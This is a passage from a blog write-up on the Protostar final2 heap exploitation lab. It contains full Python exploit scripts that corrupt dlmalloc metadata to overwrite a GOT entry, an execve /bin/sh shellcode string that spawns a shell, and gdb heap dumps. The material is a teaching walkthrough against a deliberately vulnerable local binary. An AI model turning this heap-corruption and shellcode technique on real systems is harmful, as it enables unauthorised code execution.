<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_input</span><span class="params">(s, b)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> s + (<span class="number">128</span> - (len(s) + len(b))) * <span class="string">"\x90"</span> + b</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2993</span>))</span><br><span class="line"></span><br><span class="line">first = pad_input(<span class="string">"FSRD"</span>,  <span class="string">"/"</span>)</span><br><span class="line">second = pad_input(<span class="string">"FSRDROOT"</span>, <span class="string">"/"</span> + struct.pack(<span class="string">"I"</span>, <span class="number">0x12345678</span>) * <span class="number">4</span> )</span><br><span class="line"></span><br><span class="line">s.send(first)</span><br><span class="line">s.send(second)</span><br></pre></td></tr></table></figure>
<p>We can set a breakpoint at the end of <code>check_path</code>, after the second call to <code>check_path</code>, we can inspect the heap.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x0804bd46 in check_path (buf&#x3D;0x4 &lt;Address 0x4 out of bounds&gt;) at final2&#x2F;final2.c:30</span><br><span class="line">30	in final2&#x2F;final2.c</span><br><span class="line">(gdb) x&#x2F;50x 0x804e000</span><br><span class="line">0x804e000:	0x00000000	0x00000089	0x44525346	0x90909090</span><br><span class="line">0x804e010:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e020:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e030:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e040:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e050:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e060:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e070:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e080:	0x90909090	0x2f909090	0x12345678	0x12345678</span><br><span class="line">0x804e090:	0x12345678	0x12345678	0x90909090	0x90909090</span><br><span class="line">0x804e0a0:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e0b0:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e0c0:	0x90909090	0x90909090</span><br></pre></td></tr></table></figure>

<p>You can see that we’ve successfully overwritten the heap metadata with our <code>0x12345678</code>‘s.<br>For reference, this is what the heap (with it’s metadata) looks like if we include an extra  <code>&#39;/&#39;</code> before <code>ROOT</code> in the second message.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x804e000:	0x00000000	0x00000089	0x44525346	0x90909090</span><br><span class="line">0x804e010:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e020:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e030:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e040:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e050:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e060:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e070:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e080:	0x90909090	0x2f909090	0x00000000	0x00000089</span><br><span class="line">0x804e090:	0x44525346	0x3456782f	0x34567812	0x34567812</span><br><span class="line">0x804e0a0:	0x34567812	0x90909012	0x90909090	0x90909090</span><br><span class="line">0x804e0b0:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x804e0c0:	0x90909090	0x90909090</span><br></pre></td></tr></table></figure>
<p>Now we can try modify the script to redirect code execution to somewhere that we can control the (the first buffer). Let’s pick <code>0x804e010</code> which is an address inside the first buffer.</p>
<p>Now let’s find the address of an entry in the GOT that we want to overwrite. We’re going to use <code>write</code>, which has a GOT entry at <code>0x804d41c</code>.</p>
<p>When we actually send this address, we’ll need to minus 12 off it, since <code>unlink</code> writes to the <code>bk</code> field of the chunk and we’re passing in the base address of the chunk.</p>
<p>We need to set the heap such that it allows us to exploit the bug in <code>dlmalloc</code>. We’ll be exploiting the <code>free</code> of the first buffer. This means that we need modify the chunk for the second buffer such that it has <code>PREV_INUSE</code> bit not set and also the <code>PREV_INUSE</code> bit for the next chunk not set. </p>
<p>There is a small complication that most values for the size member of the chunk struct will require <code>\x00</code> to express e.g. if we wanted a size of 100, we’d need to write <code>\x64\x00\x00\x00</code>, to the size member. However we cannot use <code>\x00</code> since the <code>read</code> method will interpret it as the end of the string. Therefore, we use a negative number instead e.g. <code>\xff\xff\xff\xfc</code> or -4, this means that it will look for this means we need to place any even number behind the <code>size</code> member and it should successfully pass the test. We’ll use -4 again, since it makes for cleaner code.</p>
<p>It’s also important that we pad the end of <code>first</code> message, because of:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3803</span>: set_head(p, size | PREV_INUSE);</span><br><span class="line"><span class="number">3804</span>: set_foot(p, size);</span><br></pre></td></tr></table></figure>
<p>in the <code>dlmalloc</code> implementation, the <code>set_head</code> will update the first chunk’s size, and the <code>set_foot</code> will write to the <code>next_chunk</code>‘s <code>prev_size</code>. However, because the size has been corrupted it’ll actually undershoot the “actual” location of the field and write into the end of the first buffer. </p>
<p>Therefore we pad the end of the <code>shellcode</code> with some <code>&#39;0x90&#39;</code>s, but any characters is fine. </p>
<p>We will also add <code>\xeb\x14</code> which is a <code>jmp 0x16</code> instruct that will skip the address that is written back into the heap. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_input</span><span class="params">(s, b)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> s + (<span class="number">128</span> - (len(s) + len(b))) * <span class="string">"\x90"</span> + b</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2993</span>))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">first = pad_input(<span class="string">"FSRD"</span> + <span class="string">"\x90"</span> * <span class="number">8</span> + <span class="string">"\xeb\x14"</span>, shellcode + <span class="string">"\x90"</span> * <span class="number">16</span> +  <span class="string">"/"</span>)</span><br><span class="line">second = pad_input(<span class="string">"FSRDROOT"</span>, <span class="string">"/"</span> +  <span class="string">"\xfc\xff\xff\xff"</span> * <span class="number">2</span> + struct.pack(<span class="string">"I"</span>, <span class="number">0x804d410</span>) + struct.pack(<span class="string">"I"</span>, <span class="number">0x804e010</span>))</span><br><span class="line">third = <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line">s.send(first)</span><br><span class="line">s.send(second)</span><br><span class="line">s.send(third)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure>

<p>In the end, we can also use a variety of different values for the injected offsets e.g.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">second = pad_input(<span class="string">"FSRDROOT"</span>, <span class="string">"/"</span> +  <span class="string">"AAAA"</span> + <span class="string">"\xf6\xff\xff\xff"</span> + struct.pack(<span class="string">"I"</span>, <span class="number">0x804d410</span>) + struct.pack(<span class="string">"I"</span>, <span class="number">0x804e014</span>))</span><br></pre></td></tr></table></figure>
<p>will also work,  since even if we look back past our injected code, it’s pretty likely we end up hitting one of our <code>\x90\x90\x90\x90</code> blocks that also does not have the <code>PREV_INUSE</code> bit set. This is also valid, however you’ll probably have to increase the padding of the shellcode, since the <code>set_foot</code> call will cause the size be written closer to the start of the first buffer.</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Challenge"><span class="toc-number">3.</span> <span class="toc-text">Challenge</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&text=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&title=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&is_video=false&description=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Binary Exploitation - Protostar - Heap&body=Check out this article: https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&title=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&title=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&title=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&title=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&name=Binary Exploitation - Protostar - Heap&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&t=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Winston Zhao
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
